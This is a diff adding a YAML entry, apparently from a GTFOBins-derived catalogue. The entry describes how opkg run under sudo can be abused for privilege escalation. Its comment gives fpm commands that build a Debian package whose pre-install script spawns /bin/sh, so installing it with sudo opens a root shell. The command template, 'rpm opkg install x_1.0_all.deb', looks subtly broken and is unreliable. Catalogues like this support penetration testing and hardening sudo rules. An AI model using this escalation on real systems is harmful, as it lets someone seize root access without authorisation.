@@ -1,0 +1,35 @@
+id: gtfobins/opkg/shell/sudo
+type: binary
+platform: linux
+name: opkg
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: rpm opkg install x_1.0_all.deb
+  comment: 'Generate the Debian package with [fpm](https://github.com/jordansissel/fpm) and upload it
+    to the target.
+
+
+    ```
+
+    echo ''exec /bin/sh'' >x.sh
+
+    fpm -n x -s dir -t deb -a all --before-install x.sh .
+
+    ```'
+references:
+- https://gtfobins.github.io/gtfobins/opkg/
+tags:
+- linux
+- unix
+- gtfobins
